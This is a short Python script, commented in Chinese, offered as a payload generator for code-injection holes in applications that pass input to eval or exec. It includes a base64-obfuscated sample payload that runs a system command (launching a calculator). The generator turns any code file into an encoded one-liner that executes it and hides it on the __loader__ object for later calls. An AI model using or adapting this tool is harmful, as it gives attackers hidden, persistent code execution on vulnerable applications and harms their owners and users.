#by leeya_bug

#写入代码到__loader__中
#适用于eval、exec等函数

#Payload: 
if False:
    #植入代码
    str(exec(__import__('base64').b64decode('ZGVmIFp6UlRTb0RFKCk6CiBpbXBvcnQgb3MKIG9zLnN5c3RlbSgnY2FsYycpCiAKIGZvciBpIGluIHJhbmdlKDAsIDEwKToKICAgICBwcmludChpKQ=='))) + str(setattr(__loader__,'ZzRTSoDE', ZzRTSoDE))
    #调用代码
    __loader__.ZzRTSoDE()

#Payload生成
FUNC_NAME = 'ZzRTSoDE'

import base64
path = input('请输入要写入的代码文件路径(默认test.py): ')
path = path if path != '' else 'test.py'
with open(path, 'r') as f:
    a = f.read()
a0 = a.split('\n')
a1 = [f'def {FUNC_NAME}():']
for i in a0:
    a1.append(chr(32) + i)
a2 = chr(10).join(a1)

a3 = base64.b64encode(a2.encode()).decode()
print('写入静态代码命令: ')
print(f'''str(exec(__import__('base64').b64decode('{a3}'))) + str(setattr(__loader__,'{FUNC_NAME}', {FUNC_NAME}))''')
print('调用静态代码命令: ')
print(f'''__loader__.{FUNC_NAME}()''')
